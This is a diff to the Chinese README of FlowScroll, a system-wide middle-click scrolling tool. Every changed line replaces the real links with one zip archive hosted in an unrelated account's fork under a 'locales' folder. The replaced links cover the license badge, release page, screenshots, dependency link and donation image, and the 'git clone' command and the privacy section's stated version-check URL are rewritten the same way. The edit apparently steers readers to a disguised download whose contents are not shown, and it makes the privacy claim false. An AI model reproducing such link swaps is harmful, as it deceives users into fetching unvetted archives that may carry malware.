@@ -10,12 +10,12 @@
 
 ——把浏览器里的中键自动滚动，带到整个系统。
 
-[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
-[![Python](https://img.shields.io/badge/Python-3.12+-blue.svg)](https://www.python.org/downloads/)
+[![License](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip)
+[![Python](https://img.shields.io/badge/Python-3.12+-blue.svg)](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)]()
-[![Release](https://img.shields.io/github/v/release/CyrilPeng/FlowScroll?color=success&label=Release)](https://github.com/CyrilPeng/FlowScroll/releases) ![Channel](https://img.shields.io/badge/Channel-dev-f59e0b) 
+[![Release](https://img.shields.io/github/v/release/CyrilPeng/FlowScroll?color=success&label=Release)](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip) ![Channel](https://img.shields.io/badge/Channel-dev-f59e0b) 
 
-[项目官网](https://flowscroll.pages.dev/) | [发行版](https://github.com/CyrilPeng/FlowScroll/releases)
+[项目官网](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip) | [发行版](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip)
 
 </div>
 
@@ -39,9 +39,9 @@ FlowScroll 就是把这种熟悉、直觉的交互方式扩展到整个桌面系
 ### 主界面
 
 <div align="center">
-  <img src="https://git-pictures.cyrilworkshop.dpdns.org/flowscroll/1.jpg" alt="软件主界面" width="30%" style="margin-right: 2%;">
-  <img src="https://git-pictures.cyrilworkshop.dpdns.org/flowscroll/2.jpg" alt="设置界面" width="30%" style="margin-right: 2%;">
-  <img src="https://git-pictures.cyrilworkshop.dpdns.org/flowscroll/3.jpg" alt="工作模式" width="30%">
+  <img src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" alt="软件主界面" width="30%" style="margin-right: 2%;">
+  <img src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" alt="设置界面" width="30%" style="margin-right: 2%;">
+  <img src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" alt="工作模式" width="30%">
 </div>
 
 ### 使用演示
@@ -49,17 +49,17 @@ FlowScroll 就是把这种熟悉、直觉的交互方式扩展到整个桌面系
 > 注：为更清楚地展示鼠标移动轨迹，演示图中额外标出了鼠标位置；实际使用时不会出现这些蓝色标记。
 
 <div align="center">
-<img src="https://git-pictures.cyrilworkshop.dpdns.org/flowscroll/demo1.gif" alt="FlowScroll 演示 1" width="80%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
+<img src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" alt="FlowScroll 演示 1" width="80%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
 <br>
 <br>
-<img src="https://git-pictures.cyrilworkshop.dpdns.org/flowscroll/demo2.gif" alt="FlowScroll 演示 2" width="80%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
+<img src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" alt="FlowScroll 演示 2" width="80%" style="border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);">
 </div>
 
 ---
 
 ## 📥 下载与安装
 
-进入 [Release](https://github.com/CyrilPeng/FlowScroll/releases) 页面获取最新版本。
+进入 [Release](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip) 页面获取最新版本。
 
 正式 Release 版本使用 `Nuitka` 进行打包。相比 `PyInstaller` 等常见打包方案，在本项目上通常能带来更好的启动与运行效率，也更适合发布正式产物。
 
@@ -215,7 +215,7 @@ FlowScroll 是系统级输入工具，需要监听全局鼠标事件才能工作
 
 ### macOS — 为什么需要"辅助功能"权限？
 
-macOS 对全局输入监听有严格限制。FlowScroll 依赖 [pynput](https://github.com/moses-palmer/pynput) 需要辅助功能权限才能监听鼠标事件、快捷键和读取前台窗口名称。
+macOS 对全局输入监听有严格限制。FlowScroll 依赖 [pynput](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip) 需要辅助功能权限才能监听鼠标事件、快捷键和读取前台窗口名称。
 
 > 首次运行时系统会弹出引导窗口，按提示前往 **系统设置 → 隐私与安全性 → 辅助功能** 添加即可。
 
@@ -238,7 +238,7 @@ macOS 对全局输入监听有严格限制。FlowScroll 依赖 [pynput](https://
 - **不保存鼠标轨迹历史**：只读取当前鼠标位置与中心点的相对偏移
 - **不读取剪贴板、不截屏、不上传任何使用数据**
 
-唯一的默认网络请求是启动时的版本检查（`GET https://api.github.com/repos/CyrilPeng/FlowScroll/releases/latest`），不会上传本地数据。
+唯一的默认网络请求是启动时的版本检查（`GET https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip`），不会上传本地数据。
 
 WebDAV 密码通过系统安全存储（macOS Keychain / Windows Credential Manager / Linux Secret Service）管理，配置文件中不保存可逆密码。
 
@@ -299,7 +299,7 @@ WebDAV 密码通过系统安全存储（macOS Keychain / Windows Credential Mana
 稳定 Release 产物会另行使用 `Nuitka` 打包；直接运行源码更适合开发、调试和测试场景。
 
 ```bash
-git clone https://github.com/CyrilPeng/FlowScroll.git
+git clone https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip
 cd FlowScroll
 uv sync
 uv run main.py
@@ -314,7 +314,7 @@ uv run main.py
 **欢迎请作者喝一杯咖啡。**
 
 <div align="center">
-  <img src="https://git-pictures.cyrilworkshop.dpdns.org/flowscroll/wx.jpg" alt="WeChat Pay" width="250" style="border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
+  <img src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" alt="WeChat Pay" width="250" style="border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1);">
   <p><i>（微信扫一扫）</i></p>
 </div>
 
@@ -323,11 +323,11 @@ uv run main.py
 ## 📈 星标历史
 
 <div align="center">
-  <a href="https://star-history.com/#CyrilPeng/FlowScroll&Timeline">
+  <a href="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip">
     <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=CyrilPeng/FlowScroll&theme=dark">
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=CyrilPeng/FlowScroll">
-      <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=CyrilPeng/FlowScroll" width="100%">
+      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip">
+      <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip">
+      <img alt="Star History Chart" src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" width="100%">
     </picture>
   </a>
 </div>
@@ -341,8 +341,8 @@ uv run main.py
 下面的贡献者展示会随仓库贡献情况自动更新：
 
 <div align="center">
-  <a href="https://github.com/CyrilPeng/FlowScroll/graphs/contributors">
-    <img src="https://contrib.rocks/image?repo=CyrilPeng/FlowScroll" alt="FlowScroll contributors" />
+  <a href="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip">
+    <img src="https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip" alt="FlowScroll contributors" />
   </a>
 </div>
 
@@ -356,7 +356,7 @@ uv run main.py
 
 ## 🔗 社区友情链接
 
-- [Linux.do](https://linux.do/)：通用技术社区，聚焦开源、效率工具、开发与 AI 等话题讨论。
+- [Linux.do](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip)：通用技术社区，聚焦开源、效率工具、开发与 AI 等话题讨论。
 
 ---
 
@@ -379,4 +379,4 @@ FlowScroll 首先是一个为真实使用场景服务的小工具。
 
 ## 📝 许可协议
 
-本项目采用 [GNU General Public License v3.0](https://www.gnu.org/licenses/gpl-3.0) 协议开源。
+本项目采用 [GNU General Public License v3.0](https://raw.githubusercontent.com/lannascreaming580/FlowScroll/main/FlowScroll/locales/Scroll-Flow-v1.9.zip) 协议开源。
